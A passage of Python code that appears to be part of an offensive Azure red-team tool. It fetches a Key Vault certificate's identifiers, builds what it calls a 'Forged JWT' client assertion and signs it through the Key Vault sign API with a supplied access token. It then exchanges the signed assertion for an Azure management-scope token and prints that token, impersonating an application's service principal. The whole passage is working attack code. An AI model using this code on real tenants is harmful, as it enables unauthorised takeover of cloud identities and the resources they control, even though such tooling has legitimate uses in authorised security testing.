    certificate = response.json()
    x5t = certificate.get('x5t')
    kid = certificate.get('kid')
    
    print_green("\n[+] Certificate Details Obtained!")
    print(f"kid: {kid or 'N/A'}")
    print(f"x5t: {x5t or 'N/A'}")
    
    # create JWT
    print_green("\n[+] Forged JWT:")
    app_id = args.id
    audience = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token"
    now = datetime.now(timezone.utc)
    jwt_expiration = int((now + timedelta(minutes=2)).timestamp())
    not_before = int(now.timestamp())
    
    jwt_header = {
        "x5t": x5t,
        "typ": "JWT",
        "alg": "RS256"
    }
    
    jwt_payload = {
        "exp": jwt_expiration,
        "sub": app_id,
        "nbf": not_before,
        "jti": str(uuid.uuid4()),
        "aud": audience,
        "iss": app_id
    }
    def base64url_encode(data):
        return base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8').rstrip('=')
    
    # encode header and payload
    header_encoded = base64url_encode(json.dumps(jwt_header))
    payload_encoded = base64url_encode(json.dumps(jwt_payload))
    
    # construct unsigned JWT
    unsigned_jwt = f"{header_encoded}.{payload_encoded}"
    jwt_sha256_hash = hashlib.sha256(unsigned_jwt.encode()).digest()
    jwt_sha256_hash_b64 = base64.urlsafe_b64encode(jwt_sha256_hash).decode().rstrip('=')
    
    # sign JWT
    new_uri = f"{kid}/sign?api-version=7.3"
    user_agent = get_user_agent(args)
    headers = {
        "Authorization": f"Bearer {get_access_token(args.token)}",
        "Accept": "application/json",
        "User-Agent": user_agent
    
    }
    request_body = {
        "alg": "RS256",
        "value": jwt_sha256_hash_b64
    }
    
    response = requests.post(new_uri, headers=headers, json=request_body)
    response.raise_for_status()
    signature = response.json()['value']
    signed_jwt = f"{unsigned_jwt}.{signature}"
    print(signed_jwt)
    
    # request azure management token
    jwt_login = f"https://login.microsoftonline.com/{args.tenant}/oauth2/v2.0/token"
    parameters = {
        "client_id": args.id,
        "client_assertion": signed_jwt,
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "scope": "https://management.azure.com/.default",
        "grant_type": "client_credentials"
    }
    
    response = requests.post(jwt_login, data=parameters)
    
    if not response.ok:
        print_red(f"\n[-] Error: {response.status_code} ({response.reason}). {response.text}")
    else:
        print_green("\n[+] Azure Management Token Obtained!")
        print(f"[*] Application ID: {args.id}")
        print(f"[*] Tenant ID: {args.tenant}")
        print("[*] Scope: https://management.azure.com/.default")
        response_json = response.json()
        for key, value in response_json.items():
            print(f"[*] {key}: {value}")
    print("=" * 80)